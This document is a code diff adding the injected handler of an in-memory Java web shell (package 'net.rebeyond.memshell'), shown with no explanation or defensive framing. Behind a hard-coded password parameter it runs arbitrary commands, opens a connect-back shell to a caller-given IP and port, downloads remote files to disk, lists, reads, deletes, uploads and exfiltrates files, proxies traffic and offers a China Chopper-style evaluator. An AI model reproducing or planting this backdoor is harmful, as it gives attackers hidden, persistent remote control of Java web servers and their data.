@@ -1,0 +1,92 @@
+	javax.servlet.http.HttpServletRequest request=$1;
+	javax.servlet.http.HttpServletResponse response = $2;
+	String pass_the_world=request.getParameter("pass_the_world");
+	String model=request.getParameter("model");
+	String result="";
+
+try {
+			if (pass_the_world!=null&&pass_the_world.equals(net.rebeyond.memshell.Agent.password))
+			{
+				if (model==null||model.equals(""))
+				{
+					result=net.rebeyond.memshell.Shell.help();
+				}
+				else if (model.equalsIgnoreCase("exec"))
+				{
+					String cmd=request.getParameter("cmd");
+					result=net.rebeyond.memshell.Shell.execute(cmd);
+				}
+				else if (model.equalsIgnoreCase("connectback"))
+				{
+					String ip=request.getParameter("ip");
+					String port=request.getParameter("port");
+					result=net.rebeyond.memshell.Shell.connectBack(ip, port);
+				}
+				else if (model.equalsIgnoreCase("urldownload"))
+				{
+					String url=request.getParameter("url");
+					String path=request.getParameter("path");
+					result=net.rebeyond.memshell.Shell.urldownload(url, path);
+				}
+				else if (model.equalsIgnoreCase("list"))
+				{
+					String path=request.getParameter("path");
+					result=net.rebeyond.memshell.Shell.list(path);
+				}
+				else if (model.equalsIgnoreCase("del"))
+				{
+					String path=request.getParameter("path");
+					result=net.rebeyond.memshell.Shell.delete(path);
+				}
+				else if (model.equalsIgnoreCase("show"))
+				{
+					String path=request.getParameter("path");
+					result=net.rebeyond.memshell.Shell.showFile(path);
+				}
+				else if (model.equalsIgnoreCase("download"))
+				{
+					String path=request.getParameter("path");
+					java.io.File f = new java.io.File(path);
+					if (f.isFile()) {
+						String fileName = f.getName();
+						java.io.InputStream inStream = new java.io.FileInputStream(path);
+						response.reset();
+						response.setContentType("bin");
+						response.addHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
+						byte[] b = new byte[100];
+						int len;
+							while ((len = inStream.read(b)) > 0)
+								response.getOutputStream().write(b, 0, len);
+							inStream.close();
+							return;
+
+					}
+				}
+				else if (model.equalsIgnoreCase("upload"))
+				{
+					String path=request.getParameter("path");
+					String fileContent=request.getParameter("content");
+					String type=request.getParameter("type");
+					if (type==null||!type.equalsIgnoreCase("b"))
+						type="a";
+					result=net.rebeyond.memshell.Shell.upload(path, fileContent,type);
+				}
+				else if (model.equalsIgnoreCase("proxy"))
+				{
+					new net.rebeyond.memshell.Proxy().doProxy(request, response);
+					return;
+				}
+				else if (model.equalsIgnoreCase("chopper"))
+				{
+					new net.rebeyond.memshell.Evaluate().doPost(request, response);
+					return;
+				}
+				response.getWriter().print(result);
+				return;
+			}
+			
+		}
+		catch(Exception e)
+		{
+			response.getWriter().print(e.getMessage());
+		}
